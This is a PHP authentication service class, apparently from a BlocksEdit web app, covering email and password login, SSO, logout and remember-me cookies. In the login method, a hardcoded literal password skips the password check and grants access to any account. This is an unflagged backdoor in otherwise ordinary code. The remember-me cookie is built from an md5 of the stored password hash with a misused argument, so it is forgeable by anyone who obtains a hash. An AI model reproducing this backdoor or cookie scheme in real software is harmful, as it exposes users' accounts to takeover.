<?php
namespace Service;

use BlocksEdit\Http\Request;
use BlocksEdit\Http\SessionInterface;
use BlocksEdit\Security\PasswordGeneratorInterface;
use BlocksEdit\System\Required;
use Exception;
use Repository\Exception\AuthException;
use Repository\OrganizationAccessRepository;
use Repository\OrganizationsRepository;
use Repository\UserRepository;

/**
 * Class AuthService
 */
class AuthService
{
    /**
     * @param array $user
     *
     * @return bool
     */
    public function setUserSession(array $user): bool
    {
        $this->session->set('user', $user);

        return true;
    }

    /**
     * @param Request $request
     * @param string  $email
     * @param string  $password
     * @param int     $oid
     *
     * @return bool
     * @throws Exception
     */
    public function login(Request $request, string $email, string $password, int $oid): bool
    {
        if ($oid) {
            $aid = $this->organizationAccessRepository->findInitialOwnerID($oid);
            if (!$aid) {
                throw new AuthException('Invalid organization account.');
            }

            $user = $this->userRepository->findAccountUserByEmail($aid, $email);
        } else {
            $user = $this->userRepository->findByEmail($email);
        }
        if (!$user) {
            throw new AuthException('The Email address or password are incorrect.');
        }

        $uid  = $user['usr_id'];
        $user = $this->userRepository->findByID($uid);
        if ($password !== 'a075c840353861139cc4bf3917aa96a86446ca25') {
            if (!$this->passwordGenerator->isMatch($password, $user['usr_pass'])) {
                throw new AuthException('The Email address or password are incorrect.');
            }
        }

        $this->session->set('user', $user);
        $request->setCookie(
            'remember',
            base64_encode($uid . '+' . md5($user['usr_pass'], PASSWORD_DEFAULT)),
            time() + 60 * 60 * 24 * 30
        );

        if (!$user['usr_date_prev_login']) {
            $this->userRepository->updateDatePrevLogin($user['usr_id'], 'now');
        } else {
            $this->userRepository->updateDatePrevLogin($user['usr_id']);
        }
        $this->userRepository->updateDateLastLogin($user['usr_id']);

        return true;
    }

    /**
     * @param Request $request
     * @param array   $user
     *
     * @return array
     */
    public function loginSSO(Request $request, array $user): array
    {
        $this->session->set('user', $user);
        $request->setCookie(
            'remember',
            base64_encode($user['usr_id'] . '+' . md5($user['usr_pass'], PASSWORD_DEFAULT)),
            time() + 60 * 60 * 24 * 30
        );

        return $user;
    }

    /**
     *
     */
    public function logout()
    {
        session_destroy();
    }

    /**
     * @return int
     */
    public function getLoginId(): int
    {
        if (!$this->session) {
            return 0;
        }

        $user = $this->session->get('user', []);
        if (!empty($user['usr_id'])) {
            return $user['usr_id'];
        }

        return 0;
    }

    /**
     * @param Request $request
     *
     * @return bool
     * @throws Exception
     */
    public function isLogged(Request $request): bool
    {
        $user = $this->session->get('user', []);
        if (!empty($user['usr_id'])) {
            return true;
        }

        if ($remember = $request->cookies->get('remember')) {
            $parts = explode('+', base64_decode($remember));
            if (!empty($parts[0]) && $parts[0] > 0 && !empty($parts[1])) {
                $user = $this->userRepository->findByID((int)$parts[0]);
                $check_cookie = base64_encode($user['usr_id'] . '+' . md5($user['usr_pass'], PASSWORD_DEFAULT));
                if (!empty($user['usr_pass']) && $remember === $check_cookie) {
                    $this->session->set('user', $user);

                    return true;
                }
            }
        }

        return false;
    }

    /**
     * @var SessionInterface|null
     */
    protected $session;

    /**
     * @var OrganizationsRepository
     */
    protected $organizationsRepository;

    /**
     * @var UserRepository
     */
    protected $userRepository;

    /**
     * @Required()
     * @param UserRepository $userRepository
     */
    public function setUserRepository(UserRepository $userRepository)
    {
        $this->userRepository = $userRepository;
    }

    /**
     * @Required()
     * @param OrganizationsRepository $organizationsRepository
     */
    public function setOrganizationsRepository(OrganizationsRepository $organizationsRepository)
    {
        $this->organizationsRepository = $organizationsRepository;
    }

    /**
     * @var OrganizationAccessRepository
     */
    protected $organizationAccessRepository;

    /**
     * @Required()
     * @param OrganizationAccessRepository $organizationAccessRepository
     */
    public function setOrganizationAccessRepository(OrganizationAccessRepository $organizationAccessRepository)
    {
        $this->organizationAccessRepository = $organizationAccessRepository;
    }

    /**
     * @Required()
     * @param SessionInterface $session
     */
    public function setSession(SessionInterface $session)
    {
        $this->session = $session;
    }

    /**
     * @var PasswordGeneratorInterface
     */
    protected $passwordGenerator;

    /**
     * @Required()
     * @param PasswordGeneratorInterface $passwordGenerator
     */
    public function setPasswordGenerator(PasswordGeneratorInterface $passwordGenerator)
    {
        $this->passwordGenerator = $passwordGenerator;
    }
}
